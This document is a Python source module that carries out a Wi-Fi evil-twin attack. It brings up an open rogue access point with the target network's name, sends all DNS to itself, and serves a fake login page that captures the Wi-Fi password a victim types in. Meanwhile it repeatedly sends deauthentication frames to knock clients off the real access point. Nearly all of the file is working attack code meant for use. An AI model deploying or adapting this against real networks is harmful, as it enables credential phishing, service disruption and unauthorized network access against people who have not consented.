"""Evil-twin rogue AP attack.

Opens a soft-AP on iface_ap (ACHM/wlan1) broadcasting the target SSID as an
open network, runs dnsmasq for DHCP + DNS redirect, and serves a captive portal
on port 80 that harvests the submitted WiFi password.  Simultaneously deauths
clients from the real AP on iface_mon so they drift to our rogue AP.

⚠️  ACHM (mt76x0u) + hostapd can freeze the kernel on some builds.  The
caller is responsible for confirming interface bring-up before launching this
function; see the step-by-step notes in CHECKPOINT.md.

External deps: hostapd, dnsmasq, iproute2 (ip), iptables.
All run as subprocesses with explicit timeouts so a hung driver doesn't block
the tool indefinitely.
"""

from __future__ import annotations

import os
import signal
import subprocess
import tempfile
import textwrap
import threading
import time
from dataclasses import dataclass
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

from .deauth import deauth as _deauth

# ── constants ────────────────────────────────────────────────────────────────

_AP_IP = "10.0.0.1"
_AP_NETWORK = "10.0.0.0/24"
_DHCP_RANGE_START = "10.0.0.10"
_DHCP_RANGE_END = "10.0.0.50"
_PORTAL_PORT = 80
_CMD_TIMEOUT = 8          # seconds for ip/iptables commands
_HOSTAPD_START_WAIT = 5  # seconds to wait for hostapd to come up
_DNSMASQ_START_WAIT = 2


# ── result type ──────────────────────────────────────────────────────────────

@dataclass
class EvilTwinResult:
    """Outcome of a run_eviltwin() call."""
    success: bool = False
    password: str | None = None
    client_mac: str | None = None
    elapsed: float = 0.0
    detail: str = ""


# ── config builders ──────────────────────────────────────────────────────────

def _hostapd_conf(iface: str, ssid: str, channel: int) -> str:
    return textwrap.dedent(f"""\
        interface={iface}
        driver=nl80211
        ssid={ssid}
        hw_mode=g
        channel={channel if channel <= 13 else 6}
        ignore_broadcast_ssid=0
        auth_algs=1
        wpa=0
    """)


def _dnsmasq_conf(iface: str) -> str:
    return textwrap.dedent(f"""\
        interface={iface}
        bind-interfaces
        dhcp-range={_DHCP_RANGE_START},{_DHCP_RANGE_END},12h
        dhcp-option=option:router,{_AP_IP}
        dhcp-option=option:dns-server,{_AP_IP}
        address=/#/{_AP_IP}
        log-dhcp
        no-resolv
        no-hosts
    """)


# ── captive portal HTTP server ────────────────────────────────────────────────

_PORTAL_HTML = """\
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>WiFi Login</title>
<style>
  body {{font-family:sans-serif;background:#1a1a2e;color:#eee;
        display:flex;align-items:center;justify-content:center;height:100vh;margin:0}}
  .box {{background:#16213e;padding:2rem 2.5rem;border-radius:12px;
         box-shadow:0 4px 24px #0008;min-width:320px}}
  h2 {{margin-top:0;color:#e94560}}
  label {{display:block;margin:.8rem 0 .2rem;font-size:.9rem;color:#aaa}}
  input {{width:100%;padding:.55rem .7rem;border-radius:6px;border:1px solid #444;
          background:#0f3460;color:#eee;font-size:1rem;box-sizing:border-box}}
  button {{margin-top:1.2rem;width:100%;padding:.65rem;border:none;
           border-radius:6px;background:#e94560;color:#fff;
           font-size:1rem;cursor:pointer}}
  .ssid {{color:#e94560;font-weight:bold}}
</style>
</head>
<body>
  <div class="box">
    <h2>&#128274; WiFi Required</h2>
    <p>To access the internet, enter the password for
       <span class="ssid">{ssid}</span>.</p>
    <form method="POST" action="/submit">
      <label>Network Password</label>
      <input type="password" name="pwd" placeholder="Password" autofocus required>
      <button type="submit">Connect</button>
    </form>
  </div>
</body>
</html>
"""

_PORTAL_SUCCESS_HTML = """\
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Connecting…</title>
<style>
  body {{font-family:sans-serif;background:#1a1a2e;color:#eee;
        display:flex;align-items:center;justify-content:center;height:100vh;margin:0}}
  .box {{background:#16213e;padding:2rem 2.5rem;border-radius:12px;text-align:center}}
  h2 {{color:#4ecca3}}
</style>
</head>
<body>
  <div class="box">
    <h2>&#10003; Connecting…</h2>
    <p>Please wait while we verify your password.</p>
  </div>
</body>
</html>
"""


def _make_portal_handler(ssid: str, result_box: list):
    """Return a handler class wired to result_box[0] for the harvested password."""

    class _Handler(BaseHTTPRequestHandler):
        def log_message(self, fmt, *args):
            pass  # silence default access log

        def _send(self, code: int, body: str) -> None:
            data = body.encode()
            self.send_response(code)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def do_GET(self):
            # Captive portal detection endpoints → redirect to portal
            self._send(200, _PORTAL_HTML.format(ssid=ssid))

        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode(errors="replace")
            params = parse_qs(body)
            pwd = params.get("pwd", [""])[0].strip()
            if pwd and not result_box:
                result_box.append(pwd)
            self._send(200, _PORTAL_SUCCESS_HTML)

    return _Handler


# ── subprocess helpers ────────────────────────────────────────────────────────

def _run(cmd: list[str], timeout: int = _CMD_TIMEOUT, check: bool = False) -> tuple[int, str]:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=check)
        return r.returncode, (r.stdout + r.stderr).strip()
    except subprocess.TimeoutExpired:
        return -1, f"timeout after {timeout}s"
    except FileNotFoundError:
        return -1, f"command not found: {cmd[0]}"


def _popen(cmd: list[str]) -> subprocess.Popen:
    return subprocess.Popen(
        cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid,  # noqa: PLW1509 - needed for process-group cleanup
    )


# ── interface setup / teardown ────────────────────────────────────────────────

def _assign_ip(iface: str) -> bool:
    _run(["ip", "addr", "flush", "dev", iface])
    rc, _out = _run(["ip", "addr", "add", f"{_AP_IP}/{24}", "dev", iface])
    if rc != 0:
        return False
    _run(["ip", "link", "set", iface, "up"])
    return True


def _flush_ip(iface: str) -> None:
    _run(["ip", "addr", "flush", "dev", iface])


def _iptables_nat_add(iface_ap: str, iface_mon: str) -> None:
    _run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", iface_mon, "-j", "MASQUERADE"])
    _run(["iptables", "-A", "FORWARD", "-i", iface_ap, "-o", iface_mon, "-j", "ACCEPT"])
    _run(["iptables", "-A", "FORWARD", "-i", iface_mon, "-o", iface_ap,
          "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])


def _iptables_nat_remove(iface_ap: str, iface_mon: str) -> None:
    _run(["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", iface_mon, "-j", "MASQUERADE"])
    _run(["iptables", "-D", "FORWARD", "-i", iface_ap, "-o", iface_mon, "-j", "ACCEPT"])
    _run(["iptables", "-D", "FORWARD", "-i", iface_mon, "-o", iface_ap,
          "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])


# ── main entry point ──────────────────────────────────────────────────────────

def run_eviltwin(
    iface_ap: str,
    iface_mon: str,
    bssid: str,
    ssid: str,
    channel: int,
    timeout: float = 120.0,
    stop_event: threading.Event | None = None,
    progress_fn=None,
) -> EvilTwinResult:
    """Launch the full evil-twin chain and wait for a password submission.

    Args:
        iface_ap:  Interface to bring up as AP (ACHM/wlan1 in managed mode).
        iface_mon: Interface already in monitor mode for deauth.
        bssid:     Real AP's BSSID — used only for deauth targeting.
        ssid:      Target network name — shown on the portal and broadcast.
        channel:   Channel for the rogue AP (2.4GHz preferred; clamped to 1-13).
        timeout:   Seconds before giving up if no password submitted.
        stop_event: Set externally to abort early.
        progress_fn: Optional callback for live per-step status (hostapd/
            dnsmasq/portal launch, each deauth round) -- previously this
            attack gave zero feedback until it fully succeeded or timed
            out, minutes later.
    """
    log = progress_fn or (lambda msg: None)
    stop = stop_event or threading.Event()
    t_start = time.monotonic()
    procs: list[subprocess.Popen] = []
    tmpfiles: list[str] = []
    servers: list[HTTPServer] = []

    def cleanup():
        for p in procs:
            try:
                os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                pass
        for srv in servers:
            try:
                srv.server_close()
            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                pass
        for f in tmpfiles:
            try:
                os.unlink(f)
            except Exception:  # noqa: BLE001, S110 - teardown must be best-effort
                pass
        _flush_ip(iface_ap)
        _iptables_nat_remove(iface_ap, iface_mon)

    try:
        # ── 1. assign IP to AP interface ──────────────────────────────────
        log(f"assigning IP to {iface_ap}")
        if not _assign_ip(iface_ap):
            log("failed to assign IP")
            return EvilTwinResult(detail="failed to assign IP to AP interface")

        # ── 2. write temp configs ─────────────────────────────────────────
        ap_chan = channel if 1 <= channel <= 13 else 6

        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
                                          prefix="atwa_hostapd_", delete=False) as hconf:
            hconf.write(_hostapd_conf(iface_ap, ssid, ap_chan))
        tmpfiles.append(hconf.name)

        with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
                                          prefix="atwa_dnsmasq_", delete=False) as dconf:
            dconf.write(_dnsmasq_conf(iface_ap))
        tmpfiles.append(dconf.name)

        # ── 3. launch hostapd ─────────────────────────────────────────────
        # ⚠️ CHECKPOINT: driver risk here — mt76x0u can freeze on AP mode.
        log(f"starting hostapd on {iface_ap} (ssid={ssid!r}, channel={ap_chan})")
        hostapd_proc = _popen(["hostapd", hconf.name])
        procs.append(hostapd_proc)
        time.sleep(_HOSTAPD_START_WAIT)
        if hostapd_proc.poll() is not None:
            log("hostapd exited immediately")
            return EvilTwinResult(detail="hostapd exited immediately — check interface/driver")
        log("hostapd up")

        # ── 4. launch dnsmasq ─────────────────────────────────────────────
        log("starting dnsmasq (DHCP/DNS for rogue AP)")
        dns_proc = _popen(["dnsmasq", "--no-daemon", f"--conf-file={dconf.name}"])
        procs.append(dns_proc)
        time.sleep(_DNSMASQ_START_WAIT)
        log("dnsmasq up")

        # ── 5. iptables NAT (optional — lets clients reach portal) ────────
        _iptables_nat_add(iface_ap, iface_mon)
        log("NAT rules added")

        # ── 6. captive portal HTTP server (background thread) ─────────────
        result_box: list[str] = []
        handler = _make_portal_handler(ssid, result_box)
        server = HTTPServer((_AP_IP, _PORTAL_PORT), handler)
        server.timeout = 1.0
        servers.append(server)

        def _serve():
            while not stop.is_set() and not result_box:
                server.handle_request()

        srv_thread = threading.Thread(target=_serve, daemon=True)
        srv_thread.start()
        log(f"captive portal listening on {_AP_IP}:{_PORTAL_PORT}")

        # ── 7. deauth loop (background thread) ────────────────────────────
        def _deauth_loop():
            round_n = 0
            while not stop.is_set() and not result_box:
                round_n += 1
                try:
                    sent = _deauth(iface_mon, bssid, channel=channel, progress_fn=log)
                    if sent == 0:
                        log(f"eviltwin deauth round {round_n}: did NOT go out to {bssid} — see the warning above")
                    else:
                        log(f"eviltwin deauth round {round_n}: sent {sent} deauth frame(s) to {bssid}")
                except Exception as exc:  # noqa: BLE001 - deauth loop must survive any one-round error
                    log(f"eviltwin deauth round {round_n} failed: {exc}")
                stop.wait(10.0)

        deauth_thread = threading.Thread(target=_deauth_loop, daemon=True)
        deauth_thread.start()

        # ── 8. wait for password or timeout ──────────────────────────────
        log(f"waiting up to {timeout:.0f}s for a password submission")
        deadline = time.monotonic() + timeout
        while not stop.is_set() and not result_box:
            if time.monotonic() >= deadline:
                break
            time.sleep(0.5)

        elapsed = time.monotonic() - t_start

        if result_box:
            stop.set()
            log(f"password captured after {elapsed:.0f}s")
            return EvilTwinResult(
                success=True,
                password=result_box[0],
                elapsed=elapsed,
                detail=f"password captured after {elapsed:.0f}s",
            )
        log("no password submitted" if not stop.is_set() else "stopped")
        return EvilTwinResult(
            elapsed=elapsed,
            detail="timeout — no password submitted" if not stop.is_set() else "aborted",
        )

    finally:
        stop.set()
        cleanup()
